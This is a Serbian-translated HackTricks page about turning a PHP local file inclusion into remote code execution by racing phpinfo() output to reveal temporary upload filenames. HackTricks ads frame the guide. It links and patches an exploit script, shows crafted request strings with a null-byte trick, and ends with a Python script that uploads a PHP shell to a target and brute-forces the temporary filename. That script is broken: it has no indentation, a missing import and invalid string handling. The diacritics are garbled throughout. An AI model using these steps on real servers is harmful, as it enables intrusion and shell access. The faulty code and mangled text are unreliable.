<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


Da biste iskoristili ovu ranjivost, potrebno vam je: **LFI ranjivost, stranica na kojoj se prikazuje phpinfo(), "file\_uploads = on" i server mora mo캖i da pi코e u "/tmp" direktorijum.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Da biste ispravili eksploit (promenite **=>** u **=>**). To mo쬰te uraditi:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Morate promeniti i **payload** na po캜etku eksploatacije (na primer, za php-rev-shell), **REQ1** (ovo bi trebalo da upu캖uje na phpinfo stranicu i trebalo bi da uklju캜uje padding, na primer: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), i **LFIREQ** (ovo bi trebalo da upu캖uje na LFI ranjivost, na primer: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Proverite dvostruki "%" prilikom iskori코캖avanja null karaktera)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Teorija

Ako su dozvoljeni uploadi u PHP-u i poku코ate da otpremite datoteku, ta datoteka se 캜uva u privremenoj direktoriji dok server ne zavr코i obradu zahteva, a zatim se ta privremena datoteka bri코e.

Zatim, ako ste prona코li LFI ranjivost na web serveru, mo쬰te poku코ati da pogodite ime privremene datoteke koja je kreirana i iskoristiti RCE pristupaju캖i privremenoj datoteci pre nego 코to bude obrisana.

Na **Windows**-u, datoteke se obi캜no 캜uvaju u **C:\Windows\temp\php**

Na **Linux**-u, ime datoteke obi캜no bude **slu캜ajno** i sme코tena je u **/tmp**. Po코to je ime slu캜ajno, potrebno je **izvu캖i negde ime privremene datoteke** i pristupiti joj pre nego 코to bude obrisana. To se mo쬰 uraditi 캜itanjem vrednosti **promenljive $\_FILES** unutar sadr쬬ja funkcije "**phpconfig()**".

**phpinfo()**

**PHP** koristi bafer od **4096B** i kada je **pun**, on se **코alje klijentu**. Zatim klijent mo쬰 **poslati** **mnogo velikih zahteva** (koriste캖i velike zaglavlja) **otpremaju캖i php** reverse **shell**, 캜ekati da se vrati **prvi deo phpinfo()** (gde je ime privremene datoteke) i poku코ati **pristupiti privremenoj datoteci** pre nego 코to php server obri코e datoteku iskori코캖avaju캖i LFI ranjivost.

**Python skripta za poku코aj brute force imena (ako je du쬴na = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
